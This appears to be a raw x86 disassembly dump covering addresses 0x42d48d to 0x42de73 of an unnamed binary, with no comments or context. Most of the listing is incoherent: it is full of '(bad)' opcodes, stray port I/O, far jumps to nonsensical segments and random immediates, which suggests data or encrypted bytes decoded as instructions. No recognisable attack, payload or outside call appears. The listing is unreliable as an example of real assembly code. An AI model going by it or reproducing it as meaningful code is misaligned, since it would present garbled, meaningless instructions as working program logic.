  42d48d:	leave  
  42d48e:	cmp    ecx,DWORD PTR [esi]
  42d490:	jb     0x42d4d5
  42d492:	aad    0xd5
  42d494:	pusha  
  42d495:	jnp    0x42d481
  42d497:	cdq    
  42d498:	push   edx
  42d499:	std    
  42d49a:	ja     0x42d4d9
  42d49c:	pop    esi
  42d49d:	(bad)  
  42d49e:	in     eax,0x27
  42d4a0:	test   al,0x91
  42d4a2:	inc    esi
  42d4a3:	push   0x5232eef8
  42d4a8:	call   0x5a3b8b71
  42d4ad:	sbb    ebx,DWORD PTR [eax]
  42d4af:	inc    ebx
  42d4b0:	adc    ebp,DWORD PTR [esi-0x3f]
  42d4b3:	(bad)  
  42d4b4:	in     al,dx
  42d4b5:	ds pop edi
  42d4b7:	stos   DWORD PTR es:[edi],eax
  42d4b8:	add    al,0x79
  42d4ba:	mov    ecx,0x64cd988e
  42d4bf:	out    0xce,al
  42d4c1:	in     al,0x6d
  42d4c3:	xchg   DWORD PTR [ebx],esi
  42d4c5:	xor    BYTE PTR ds:0x425fe69b,0xe3
  42d4cc:	test   eax,0x44f90120
  42d4d1:	loopne 0x42d48f
  42d4d3:	add    esi,DWORD PTR [edi]
  42d4d5:	mov    esp,DWORD PTR [ebp-0x2f]
  42d4d8:	cmc    
  42d4d9:	cs jo  0x42d529
  42d4dc:	push   esp
  42d4dd:	jmp    0xd87e:0x28661a99
  42d4e4:	mul    DWORD PTR [edx+0x68]
  42d4e7:	push   eax
  42d4e8:	iret   
  42d4e9:	dec    eax
  42d4ea:	push   ebp
  42d4eb:	xor    DWORD PTR [edi+0x2e],eax
  42d4ee:	sbb    dl,BYTE PTR [edx]
  42d4f0:	sbb    eax,0x5e6d5552
  42d4f5:	test   DWORD PTR [ebx-0x73],0x9d9f2eb7
  42d4fc:	dec    edx
  42d4fd:	xor    esp,DWORD PTR [ebp+esi*4+0x21]
  42d501:	daa    
  42d502:	cmp    al,0xf
  42d504:	rol    esp,0x57
  42d507:	and    al,0x1f
  42d509:	or     esi,esi
  42d50b:	ins    DWORD PTR es:[edi],dx
  42d50c:	and    ecx,edx
  42d50e:	add    BYTE PTR [ecx+0x90],bh
	...
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0xa4b43bd5,eax
  42d583:	xchg   edi,eax
  42d584:	daa    
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0x86000001,al
  42d58d:	push   0x8654d857
  42d592:	stos   BYTE PTR es:[edi],al
  42d593:	pop    edi
  42d594:	popf   
  42d595:	inc    edi
  42d596:	mov    ds:0x515fc53d,eax
  42d59b:	ret    0xff93
  42d59e:	add    BYTE PTR [ebx+0x47],ah
  42d5a1:	imul   edx,DWORD PTR es:[ecx],0x7b
  42d5a5:	and    DWORD PTR [ebx-0xdff5cb9],edi
  42d5ab:	icebp  
  42d5ac:	retf   
  42d5ad:	or     ch,BYTE PTR [esi+0x4eda8e87]
  42d5b3:	loope  0x42d5a9
  42d5b5:	jmp    0x1b1528e
  42d5ba:	mov    ebp,0xc9385f32
  42d5bf:	ret    
  42d5c0:	mov    edi,0x197b0960
  42d5c5:	mov    dh,0xf8
  42d5c7:	jg     0x42d5cf
  42d5c9:	sub    bh,cl
  42d5cb:	pop    ds
  42d5cc:	jp     0x42d57c
  42d5ce:	(bad)  
  42d5cf:	lock xchg edi,eax
  42d5d1:	int    0x51
  42d5d3:	push   cs
  42d5d4:	dec    ebx
  42d5d5:	mov    ebx,0xa7a30a42
  42d5da:	neg    ebp
  42d5dc:	or     eax,0x310bee7f
  42d5e1:	sahf   
  42d5e2:	pusha  
  42d5e3:	mov    esi,0xca399ac4
  42d5e8:	sbb    eax,0xcd33f77b
  42d5ed:	pop    esp
  42d5ee:	jle    0x42d594
  42d5f0:	jge    0x42d5bc
  42d5f2:	dec    edi
  42d5f3:	mov    WORD PTR [edx+ebp*8],ds
  42d5f6:	sbb    eax,0x5b736549
  42d5fb:	dec    esi
  42d5fc:	aaa    
  42d5fd:	cld    
  42d5fe:	sbb    ch,BYTE PTR [esi-0x75e98b62]
  42d604:	adc    al,0x40
  42d606:	and    DWORD PTR [ebx-0x7fa6206e],eax
  42d60c:	ins    BYTE PTR es:[edi],dx
  42d60d:	push   ds
  42d60e:	dec    ebx
  42d60f:	imul   ecx,eax,0x62
  42d612:	lea    esp,[ebx+0x1c]
  42d615:	ss cld 
  42d617:	stc    
  42d618:	jecxz  0x42d5a8
  42d61a:	mov    bh,0x3c
  42d61c:	(bad)  
  42d61d:	and    eax,0xd0319d5c
  42d622:	mov    esi,0x4a97e412
  42d627:	lea    ecx,[ebx-0xc]
  42d62a:	pop    eax
  42d62b:	in     eax,dx
  42d62c:	test   eax,0x9643c811
  42d631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d632:	xchg   DWORD PTR [edi],eax
  42d634:	dec    edi
  42d635:	jnp    0x42d5bd
  42d637:	pop    esi
  42d638:	test   DWORD PTR [edi-0x7d],eax
  42d63b:	pop    es
  42d63c:	pop    esp
  42d63d:	jne    0x42d696
  42d63f:	ds dec edi
  42d641:	imul   eax,DWORD PTR [ebp-0x280faf09],0xc409558e
  42d64b:	sbb    al,0xd7
  42d64d:	push   ebx
  42d64e:	dec    eax
  42d64f:	sub    eax,0xdcc54cff
  42d654:	xchg   ecx,eax
  42d655:	es (bad) 
  42d657:	pop    esp
  42d658:	and    ebx,eax
  42d65a:	cmovl  edi,DWORD PTR [edx]
  42d65d:	push   ss
  42d65e:	lods   eax,DWORD PTR ds:[esi]
  42d65f:	nop
  42d660:	jge    0x42d5e4
  42d662:	or     BYTE PTR [esi-0x46],cl
  42d665:	adc    cl,BYTE PTR [ebx]
  42d667:	mov    esi,DWORD PTR [ebp-0x6df9ed50]
  42d66d:	iret   
  42d66e:	jo     0x42d645
  42d670:	ror    BYTE PTR [eax-0x6c],cl
  42d673:	dec    eax
  42d674:	cmp    BYTE PTR ds:0xc8f35614,0xa0
  42d67b:	call   0x6518:0x91cee164
  42d682:	xor    DWORD PTR [ecx-0x23aa31fe],0x5a
  42d689:	rol    DWORD PTR [edx+0x1cd06d23],1
  42d68f:	xchg   ecx,eax
  42d690:	mov    eax,ds:0x0
	...
  42d6f1:	add    BYTE PTR [eax],al
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x33
  42d701:	adc    eax,0xe72c55cf
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    eax,0x44000001
  42d70d:	sbb    al,0x53
  42d70f:	adc    BYTE PTR [esi-0x5f11fee8],ch
  42d715:	pop    es
  42d716:	mov    ch,0x64
  42d718:	jnp    0x42d6d1
  42d71a:	aaa    
  42d71b:	nop
  42d71c:	test   BYTE PTR [eax],bl
  42d71e:	aaa    
  42d71f:	(bad)  [eax]
  42d721:	cli    
  42d722:	je     0x42d750
  42d724:	mov    edi,ebx
  42d726:	push   DWORD PTR [ecx-0x5b]
  42d729:	inc    ebx
  42d72a:	std    
  42d72b:	mov    DWORD PTR [edi],esi
  42d72d:	jmp    DWORD PTR [ebp+0x92aaf7]
  42d733:	jp     0x42d746
  42d735:	repnz addr16 sti 
  42d738:	shl    BYTE PTR [esi+0x7237f5f2],1
  42d73e:	nop
  42d73f:	xchg   esi,eax
  42d740:	out    0xff,al
  42d742:	test   bl,0xa1
  42d745:	mov    DWORD PTR [edi-0x72],edx
  42d748:	xor    eax,0x82730cf3
  42d74d:	fs pop ebx
  42d74f:	or     BYTE PTR [eax],dh
  42d751:	in     al,dx
  42d752:	xor    BYTE PTR [esi+0x7b836cff],ah
  42d758:	ret    0xb969
  42d75b:	inc    ebp
  42d75c:	int3   
  42d75d:	inc    esi
  42d75e:	push   esp
  42d75f:	int3   
  42d760:	iret   
  42d761:	push   esp
  42d762:	sbb    BYTE PTR [esi],dl
  42d764:	push   0x9204d88a
  42d769:	clc    
  42d76a:	shr    BYTE PTR [ecx+0x400908dd],0xed
  42d771:	ss mov edi,0x9f63d024
  42d777:	iret   
  42d778:	addr16 mov bh,0x3b
  42d77b:	mov    DWORD PTR [eax+0x32],ebp
  42d77e:	lods   eax,DWORD PTR ds:[esi]
  42d77f:	out    dx,eax
  42d780:	(bad)  
  42d781:	mov    ecx,0x55362965
  42d786:	retf   
  42d787:	sbb    al,0x6d
  42d789:	cmp    edx,DWORD PTR [esi+0x70]
  42d78c:	mov    edx,0x66cbd724
  42d791:	in     al,0x5c
  42d793:	das    
  42d794:	inc    ebp
  42d795:	aas    
  42d796:	hlt    
  42d797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d798:	fcomp  QWORD PTR [ecx]
  42d79a:	shr    ah,cl
  42d79c:	(bad)  
  42d79d:	mov    dh,0x7f
  42d79f:	repz mov edi,DWORD PTR [edx+eiz*8]
  42d7a3:	add    DWORD PTR [ecx+0x6279facf],eax
  42d7a9:	inc    eax
  42d7aa:	inc    eax
  42d7ab:	jle    0x42d79f
  42d7ad:	inc    esp
  42d7ae:	ror    BYTE PTR [ecx+esi*8+0x18e80d51],cl
  42d7b5:	add    BYTE PTR [ebp+edx*1-0x3a01c4b7],dl
  42d7bc:	ror    BYTE PTR [esi+edi*1+0x49],cl
  42d7c0:	xor    eax,0x835bea43
  42d7c5:	ins    DWORD PTR es:[edi],dx
  42d7c6:	mov    ecx,0x37d4e74c
  42d7cb:	scas   al,BYTE PTR es:[edi]
  42d7cc:	(bad)  
  42d7ce:	sbb    bh,BYTE PTR [ebx-0x40]
  42d7d1:	sub    BYTE PTR [edx],0xae
  42d7d4:	xchg   ebp,eax
  42d7d5:	ss addr16 jp 0x42d7a4
  42d7d9:	lahf   
  42d7da:	mov    ecx,0xdc615a6c
  42d7df:	mov    eax,ds:0x2b93aeb
  42d7e4:	fnstenv [ecx-0x2c8e92b]
  42d7ea:	icebp  
  42d7eb:	sub    DWORD PTR [ebp-0x64],ebx
  42d7ee:	retf   0xaa8a
  42d7f1:	sub    ecx,ebp
  42d7f3:	inc    eax
  42d7f4:	sub    BYTE PTR [esi],dl
  42d7f6:	test   eax,0x9553ef80
  42d7fb:	mov    ecx,0x1d8b3047
  42d800:	arpl   WORD PTR ds:0xd73f0b39,sp
  42d806:	or     DWORD PTR [esi],ebx
  42d808:	icebp  
  42d809:	push   edi
  42d80a:	outs   dx,DWORD PTR ds:[esi]
  42d80c:	sbb    bl,BYTE PTR [edi+0x39]
  42d80f:	lock mov bh,0x0
	...
  42d872:	add    BYTE PTR [eax],al
  42d874:	xchg   esi,eax
  42d875:	fwait
  42d876:	cwde   
  42d877:	pop    edi
  42d878:	popf   
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x96c6961a
  42d881:	jne    0x42d893
  42d883:	mov    ecx,0x1e831
  42d888:	add    eax,0x4c000001
  42d88d:	ins    DWORD PTR es:[edi],dx
  42d88e:	data16 daa 
  42d890:	or     al,0x87
  42d893:	ja     0x42d897
  42d895:	add    al,0x31
  42d897:	xor    ah,bl
  42d899:	int    0xea
  42d89b:	mov    ebp,0x74c51de2
  42d8a0:	fisubr DWORD PTR [esi+ebx*2-0x3fa0ed54]
  42d8a7:	mov    ch,0x8d
  42d8a9:	arpl   WORD PTR [ebx],di
  42d8ab:	xor    al,0xc9
  42d8ad:	gs pop ebp
  42d8af:	mov    ebp,0x2c900c5d
  42d8b4:	in     al,dx
  42d8b5:	div    BYTE PTR [edi]
  42d8b7:	add    DWORD PTR [edx+0x6d],edi
  42d8ba:	inc    ebx
  42d8bb:	pop    ds
  42d8bc:	push   edi
  42d8bd:	sub    eax,0x8265b1cd
  42d8c2:	mov    ch,0xf0
  42d8c4:	pop    edi
  42d8c5:	inc    DWORD PTR [ebx]
  42d8c7:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42d8c9:	daa    
  42d8ca:	(bad)  
  42d8cb:	pop    edx
  42d8cc:	jg     0x42d91b
  42d8ce:	sbb    edx,edx
  42d8d0:	aas    
  42d8d1:	fdiv   st,st(5)
  42d8d3:	ret    0x6783
  42d8d6:	rcl    ebp,0xef
  42d8d9:	cs out 0x22,eax
  42d8dc:	push   ebp
  42d8dd:	inc    ebx
  42d8de:	jns    0x42d907
  42d8e0:	sysenter 
  42d8e2:	and    eax,0xa895cf54
  42d8e7:	clc    
  42d8e8:	int3   
  42d8e9:	inc    esp
  42d8ea:	mov    dh,0x6e
  42d8ec:	les    eax,FWORD PTR [edx*2-0xa3b40a8]
  42d8f3:	mov    eax,ds:0xaa69d3f6
  42d8f8:	retf   
  42d8f9:	rcl    DWORD PTR [edi],0x85
  42d8fc:	loopne 0x42d8c4
  42d8fe:	cmp    BYTE PTR ds:0xfe4bdd34,cl
  42d904:	mov    eax,0x2425fc24
  42d909:	int    0x9d
  42d90b:	or     DWORD PTR ds:0xae5dc07a,0x1bf2b046
  42d915:	mov    edx,ebp
  42d917:	aas    
  42d918:	mov    dl,0x62
  42d91a:	ins    BYTE PTR es:[edi],dx
  42d91b:	xchg   ebx,eax
  42d91c:	cmp    ebp,DWORD PTR [ebx+0x20]
  42d91f:	call   0x8993:0xa023244a
  42d926:	dec    edi
  42d927:	push   cs
  42d928:	sub    dl,BYTE PTR [ecx-0x2b]
  42d92b:	bound  esi,QWORD PTR ds:0xcbc2f840
  42d931:	iret   
  42d932:	hlt    
  42d933:	sbb    ch,BYTE PTR [esi+0x7e4f8693]
  42d939:	test   al,0xbd
  42d93b:	cmp    al,0x59
  42d93d:	shr    edi,0xd7
  42d940:	push   cs
  42d941:	pop    es
  42d942:	push   ss
  42d943:	neg    DWORD PTR [edx]
  42d945:	(bad)  
  42d946:	fst    QWORD PTR [ecx-0x7d11314]
  42d94c:	xor    DWORD PTR [ebp-0x5b],0xc9e8a676
  42d953:	adc    BYTE PTR [bx+si-0x26],0x66
  42d958:	mov    WORD PTR [edi+0x57978de5],es
  42d95e:	push   edi
  42d95f:	repnz inc eax
  42d961:	xlat   BYTE PTR ds:[ebx]
  42d962:	(bad)  [esi]
  42d964:	mov    ebx,0x8a70a611
  42d969:	cmc    
  42d96a:	dec    edx
  42d96b:	pop    edi
  42d96c:	in     eax,0x98
  42d96e:	(bad)  
  42d96f:	ror    BYTE PTR [ebx+0x9],cl
  42d972:	mov    bh,0xd9
  42d974:	inc    ebx
  42d975:	sub    DWORD PTR [ebx],eax
  42d977:	mov    cl,0x8a
  42d979:	add    ecx,DWORD PTR [esi]
  42d97b:	les    esi,FWORD PTR [edi]
  42d97d:	adc    eax,0xf0ac126
  42d982:	rol    BYTE PTR [edx-0x483b08b3],cl
  42d988:	shl    edi,1
  42d98a:	dec    esp
  42d98b:	sbb    al,0x8b
  42d98d:	push   edi
  42d98e:	sub    ebx,DWORD PTR [esi+0x75]
	...
  42d9f4:	stc    
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	adc    eax,0x36c6a734
  42da05:	jmp    0x147da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	sbb    al,BYTE PTR [ebp+0x65]
  42da0f:	or     eax,0x12dfe38e
  42da14:	jmp    0x42da72
  42da16:	xor    DWORD PTR [edi],0xffffffaa
  42da19:	add    DWORD PTR [esi-0x4f],ebx
  42da1c:	add    al,0x6
  42da1e:	add    eax,0xe01f457f
  42da23:	xchg   ebp,eax
  42da24:	jnp    0x42d9ef
  42da26:	and    DWORD PTR [ebx-0x49110f61],esp
  42da2c:	fsubr  st(5),st
  42da2e:	aas    
  42da2f:	in     eax,0x80
  42da31:	ss mov al,0x11
  42da34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da35:	jno    0x42da9f
  42da37:	xchg   DWORD PTR [ecx-0x22433603],ebp
  42da3d:	in     al,0x50
  42da3f:	(bad)  
  42da40:	rol    BYTE PTR ds:0xbe5c9c61,cl
  42da46:	mov    al,0x65
  42da48:	pop    ss
  42da49:	jg     0x42d9d4
  42da4b:	mov    bl,0x35
  42da4d:	inc    ebp
  42da4e:	mov    ecx,0x84e48922
  42da53:	jo     0x42da3b
  42da55:	test   dl,dl
  42da57:	pop    esi
  42da58:	dec    eax
  42da59:	push   DWORD PTR ss:[eax]
  42da5c:	daa    
  42da5d:	retf   
  42da5e:	and    BYTE PTR [eax],dh
  42da60:	push   eax
  42da61:	jmp    DWORD PTR [ecx-0x25ac0f9d]
  42da67:	and    al,0x79
  42da69:	or     BYTE PTR [edi+eiz*2],bl
  42da6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da6d:	add    al,0x2f
  42da6f:	add    cl,BYTE PTR [eax]
  42da71:	cld    
  42da72:	inc    edi
  42da73:	push   ds
  42da74:	pop    ebp
  42da75:	bound  ecx,QWORD PTR [eax+0x18]
  42da78:	pop    edx
  42da79:	pushf  
  42da7a:	and    BYTE PTR [ecx-0x7f],ah
  42da7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da7e:	xchg   ebp,eax
  42da7f:	les    eax,FWORD PTR [ecx-0x67]
  42da82:	inc    ecx
  42da83:	xchg   ebx,eax
  42da84:	sub    al,0x0
  42da86:	and    edx,DWORD PTR [esi-0x767f6e09]
  42da8c:	sahf   
  42da8d:	adc    al,0x9b
  42da8f:	clc    
  42da90:	dec    esp
  42da91:	jnp    0x42daa9
  42da93:	lea    esp,[eax-0x5a]
  42da96:	add    al,0x3b
  42da98:	(bad)  
  42da99:	add    cl,al
  42da9b:	ins    DWORD PTR es:[edi],dx
  42da9c:	xchg   DWORD PTR [edi+eiz*8+0x25],eax
  42daa0:	xchg   ebp,eax
  42daa1:	aad    0x46
  42daa3:	adc    DWORD PTR [ebp+0x56],0x9e242455
  42daaa:	(bad)  
  42daab:	iret   
  42daac:	clc    
  42daad:	xor    esi,DWORD PTR [edi-0x32446d81]
  42dab3:	and    ah,BYTE PTR [edi+0x43]
  42dab6:	push   ebx
  42dab7:	xor    eax,DWORD PTR [ebp-0x4]
  42daba:	bound  esp,QWORD PTR [ebp-0x22]
  42dabd:	cwde   
  42dabe:	jl     0x42dacb
  42dac0:	enter  0x3fd9,0xcc
  42dac4:	mov    gs,esp
  42dac6:	popa   
  42dac7:	inc    ecx
  42dac8:	outs   dx,BYTE PTR ds:[esi]
  42dac9:	retf   0xe298
  42dacc:	lods   al,BYTE PTR ds:[esi]
  42dacd:	push   cs
  42dace:	push   eax
  42dacf:	adc    al,0x16
  42dad1:	mov    ds:0x50bcad8d,eax
  42dad6:	jecxz  0x42db2b
  42dad8:	jbe    0x42db22
  42dada:	test   DWORD PTR [edx+0x63],ebp
  42dadd:	nop
  42dade:	push   DWORD PTR [esi+eiz*4+0x425b3806]
  42dae5:	push   ecx
  42dae6:	or     cl,BYTE PTR [edi]
  42dae8:	(bad)  [ebp+eiz*4+0x1b45e40]
  42daef:	test   BYTE PTR [edx+0x5044eadd],0xca
  42daf6:	mov    al,ds:0xc9dfab30
  42dafb:	jns    0x42db40
  42dafd:	pushf  
  42dafe:	popf   
  42daff:	push   ebp
  42db00:	stos   BYTE PTR es:[edi],al
  42db01:	push   ecx
  42db02:	xor    dl,cl
  42db04:	jg     0x42dad3
  42db06:	dec    esp
  42db07:	xchg   ebx,eax
  42db08:	xchg   ebx,eax
  42db09:	shl    esi,cl
  42db0b:	jne    0x42daa7
  42db0d:	push   esp
  42db0e:	xchg   ebx,esp
  42db10:	pop    ss
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42dbd3
  42db81:	jmp    0x42db61
  42db83:	retf   0xea3b
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    eax,0xd9000001
  42db8d:	scas   eax,DWORD PTR es:[edi]
  42db8e:	xor    ch,BYTE PTR [esi-0x3265be69]
  42db94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db95:	mov    ah,0x6d
  42db97:	mov    al,ds:0xcebf0c44
  42db9c:	sqrtps xmm7,xmm0
  42db9f:	or     dh,BYTE PTR ds:0x2530f473
  42dba5:	jg     0x42dbd1
  42dba7:	icebp  
  42dba8:	ins    BYTE PTR es:[edi],dx
  42dba9:	xor    BYTE PTR [ebx],al
  42dbab:	xor    al,0xe7
  42dbad:	or     ch,BYTE PTR [ebx]
  42dbaf:	xchg   ebx,eax
  42dbb0:	cwde   
  42dbb1:	bound  ebx,QWORD PTR [esi+0x5f]
  42dbb4:	push   esi
  42dbb5:	sub    edx,DWORD PTR [ebp+ebp*4-0x73]
  42dbb9:	fnstsw WORD PTR [ebp+0x10b35db4]
  42dbbf:	pop    ss
  42dbc0:	adc    bh,ch
  42dbc2:	mov    esp,0x7d688787
  42dbc7:	pusha  
  42dbc8:	jmp    0x42dc3c
  42dbca:	adc    esi,DWORD PTR [edx+ebx*1+0x3ee3f3a2]
  42dbd1:	xor    edi,DWORD PTR [ecx+0x23]
  42dbd4:	ss cld 
  42dbd6:	cmp    ecx,edx
  42dbd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbd9:	enter  0x3116,0xe
  42dbdd:	int    0xa1
  42dbdf:	cmp    al,dh
  42dbe1:	push   es
  42dbe2:	sahf   
  42dbe3:	mov    ebx,0xfe039e93
  42dbe8:	test   BYTE PTR [ebp+0x2],dh
  42dbeb:	test   BYTE PTR [ebx+esi*4],dl
  42dbee:	sbb    al,0x44
  42dbf0:	xchg   ecx,eax
  42dbf1:	jns    0x42dc5d
  42dbf3:	ins    DWORD PTR es:[edi],dx
  42dbf4:	dec    ecx
  42dbf5:	test   al,0x66
  42dbf7:	sub    eax,0x1d85014
  42dbfc:	xchg   edx,eax
  42dbfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbfe:	add    DWORD PTR [ecx+0x437c5d14],ebp
  42dc04:	pop    ds
  42dc05:	xor    ah,BYTE PTR [eax-0x16de69fa]
  42dc0b:	shl    DWORD PTR [esi+ecx*4+0x2b],1
  42dc0f:	sti    
  42dc10:	(bad)  
  42dc11:	add    BYTE PTR [bp+di],bl
  42dc14:	(bad)  
  42dc15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc16:	das    
  42dc17:	imul   DWORD PTR [esi+eiz*8]
  42dc1a:	pop    esp
  42dc1b:	(bad)  
  42dc1c:	add    BYTE PTR [ebp+0x4c],cl
  42dc1f:	bound  eax,QWORD PTR [ebx-0x6e158eb8]
  42dc25:	mov    ebp,DWORD PTR [ebp-0x8212313]
  42dc2b:	mov    eax,DWORD PTR [ecx-0x12]
  42dc2e:	cmp    bl,BYTE PTR [ecx+0x50851533]
  42dc34:	call   FWORD PTR [esi+0x42]
  42dc37:	sub    ecx,ebx
  42dc39:	pop    ebx
  42dc3a:	or     al,0xee
  42dc3c:	out    dx,eax
  42dc3d:	jle    0x42dc06
  42dc3f:	loopne 0x42dc77
  42dc41:	push   ebp
  42dc42:	cmp    eax,0x473d0cb
  42dc47:	sbb    DWORD PTR [ebx-0x3f5a6e82],ebp
  42dc4d:	ins    BYTE PTR es:[edi],dx
  42dc4e:	int3   
  42dc4f:	inc    esi
  42dc50:	lods   al,BYTE PTR ds:[esi]
  42dc51:	sub    BYTE PTR ds:0x324b7319,ch
  42dc57:	jb     0x42dcbc
  42dc59:	fistp  WORD PTR [edi]
  42dc5b:	test   al,0x0
  42dc5d:	xor    dh,ch
  42dc5f:	ror    ebx,0xec
  42dc62:	paddusw mm2,QWORD PTR [eax]
  42dc65:	inc    esp
  42dc66:	push   edi
  42dc67:	cs add eax,0x1508582e
  42dc6d:	mov    ah,0x65
  42dc6f:	push   ds
  42dc70:	fstp   DWORD PTR [eax-0x292a37ba]
  42dc76:	div    BYTE PTR [ecx-0x26d43d54]
  42dc7c:	mov    al,ds:0x71c0471a
  42dc81:	test   al,0xdf
  42dc83:	shr    BYTE PTR [edi+0xe],1
  42dc86:	lods   al,BYTE PTR ds:[esi]
  42dc87:	pop    ebx
  42dc88:	adc    bl,dh
  42dc8a:	and    al,bl
  42dc8c:	adc    al,0x45
  42dc8e:	push   edx
  42dc8f:	loope  0x42dcd0
	...
  42dcf1:	add    BYTE PTR [eax],al
  42dcf3:	add    BYTE PTR [ecx],bh
  42dcf5:	mov    bh,0x6d
  42dcf7:	pxor   mm3,mm7
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	mov    dh,0x14
  42dd02:	mov    ah,0xe5
  42dd04:	inc    eax
  42dd05:	jmp    0x42dd08
  42dd07:	add    BYTE PTR ds:0x82000001,al
  42dd0d:	ror    bl,1
  42dd0f:	ficomp DWORD PTR [ebp-0x3600c194]
  42dd15:	lea    ebx,[edi-0x1e7c885c]
  42dd1b:	data16 mov bl,0x43
  42dd1e:	sub    DWORD PTR [edi-0x7d],ebp
  42dd21:	lea    edi,[eax-0x37]
  42dd24:	aaa    
  42dd25:	mov    bl,0xc9
  42dd27:	xchg   ebp,eax
  42dd28:	mov    ch,0x53
  42dd2a:	mov    bl,0xbe
  42dd2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd2d:	xor    BYTE PTR [eax-0x1b],ch
  42dd30:	lods   al,BYTE PTR ds:[esi]
  42dd31:	scas   eax,DWORD PTR es:[edi]
  42dd32:	push   ebx
  42dd33:	xchg   edx,eax
  42dd34:	mov    ?,edi
  42dd36:	cli    
  42dd37:	aam    0x8f
  42dd39:	xchg   ecx,eax
  42dd3a:	mov    esi,0x6f41757f
  42dd3f:	sub    eax,0xa5b2e39d
  42dd44:	mov    bl,0x3a
  42dd46:	bound  ecx,QWORD PTR [ecx+0x46e3efd4]
  42dd4c:	ins    DWORD PTR es:[edi],dx
  42dd4d:	push   cs
  42dd4e:	pop    ss
  42dd4f:	(bad)  
  42dd50:	mul    BYTE PTR [ecx+eiz*2-0x66]
  42dd54:	jns    0x42dd57
  42dd56:	add    ch,dh
  42dd58:	xchg   ebp,eax
  42dd59:	lods   al,BYTE PTR ds:[esi]
  42dd5a:	cs aas 
  42dd5c:	cld    
  42dd5d:	mov    ch,bh
  42dd5f:	or     BYTE PTR [ebx+edx*1],cl
  42dd62:	pop    ebx
  42dd63:	or     cl,0xf2
  42dd66:	mov    al,ds:0x90a5d20a
  42dd6b:	shl    cl,0xb4
  42dd6e:	or     edi,ebp
  42dd70:	loopne 0x42dd9c
  42dd72:	mov    esp,0xb95e558a
  42dd77:	les    edi,FWORD PTR [ecx+0x6b]
  42dd7a:	ror    BYTE PTR [ebp-0x60b68783],1
  42dd80:	pop    ebx
  42dd81:	imul   eax,DWORD PTR [esi+0x1c],0xffffff9e
  42dd85:	xchg   ebp,eax
  42dd86:	repz xor eax,0xb0467f74
  42dd8c:	push   0xe06cf779
  42dd91:	jbe    0x42dd6b
  42dd93:	test   ah,al
  42dd95:	mov    eax,0xcbe94f9e
  42dd9a:	sub    ebx,DWORD PTR [ebp-0x723bab8b]
  42dda0:	dec    esi
  42dda1:	jecxz  0x42ddf2
  42dda3:	ret    0xd253
  42dda6:	stos   DWORD PTR es:[edi],eax
  42dda7:	icebp  
  42dda8:	pop    ss
  42dda9:	dec    ebx
  42ddaa:	fimul  WORD PTR [esi+0x71a78a12]
  42ddb0:	and    eax,0xef828caa
  42ddb5:	icebp  
  42ddb6:	dec    eax
  42ddb7:	loope  0x42de23
  42ddb9:	jp     0x42dda3
  42ddbb:	cld    
  42ddbc:	and    al,0xcd
  42ddbe:	mov    ds:0x6460800,eax
  42ddc3:	stos   DWORD PTR es:[edi],eax
  42ddc4:	icebp  
  42ddc5:	mov    ?,WORD PTR [esi+0x30]
  42ddc8:	sbb    al,0xf7
  42ddca:	in     eax,0x3c
  42ddcc:	mov    cl,0x98
  42ddce:	aam    0x8d
  42ddd0:	dec    eax
  42ddd1:	call   0x7eaa8816
  42ddd6:	dec    ebp
  42ddd7:	push   ss
  42ddd8:	and    ecx,ebx
  42ddda:	test   al,0x3e
  42dddc:	shl    edi,cl
  42ddde:	sahf   
  42dddf:	pushf  
  42dde0:	cli    
  42dde1:	pop    eax
  42dde2:	test   BYTE PTR [eax],bl
  42dde4:	in     eax,0x69
  42dde6:	jnp    0x42dda0
  42dde8:	or     edx,ecx
  42ddea:	fild   QWORD PTR [ebp-0x74]
  42dded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ddee:	(bad)  
  42ddef:	call   0x99258aa1
  42ddf4:	lods   al,BYTE PTR ds:[esi]
  42ddf5:	mov    al,ds:0xd7dd9e6f
  42ddfa:	aas    
  42ddfb:	ins    BYTE PTR es:[edi],dx
  42ddfc:	sbb    al,0x30
  42ddfe:	aam    0xaa
  42de00:	(bad)  
  42de01:	xchg   DWORD PTR [ebx-0x13917ff8],edx
  42de07:	xcrypt-ctr (bad)
  42de08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de09:	pop    ebx
  42de0a:	sbb    al,0x83
  42de0c:	jbe    0x42de72
  42de0e:	loopne 0x42de6f
  42de10:	sahf   
	...
  42de71:	add    BYTE PTR [eax],al
  42de73:	add    dh,ah
